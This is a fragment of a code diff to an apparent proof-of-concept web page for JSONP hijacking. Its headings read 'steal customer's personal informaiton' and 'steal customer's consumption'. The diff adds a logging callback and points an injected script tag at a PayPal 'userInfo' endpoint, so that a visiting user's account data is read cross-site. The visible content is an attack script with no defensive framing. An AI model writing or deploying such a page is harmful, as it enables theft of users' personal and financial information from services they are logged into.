@@ -17,6 +17,11 @@ steal customer's personal informaiton
 steal customer's consumption
 <textarea id="consumption" style="width: 200px; height: 150px;"></textarea>
 </div>
+<script type="text/javascript">
+    function handleResponse(response){
+            console.log(response);
+    }
+</script>
 <script>
 
      var xmlhttp2 = new XMLHttpRequest()
@@ -52,7 +57,7 @@ steal customer's consumption
 	    oBtn.onclick = function() {     
 
 		var script = document.createElement("script");
-		script.src = "https://api.douban.com/v2/book/search?q=javascript&count=1&callback=handleResponse";
+		script.src = "https://www.paypal.com/bizcomponents/userInfo?callback=handleResponse";
 		document.body.insertBefore(script, document.body.firstChild);   
 	    };
 	};
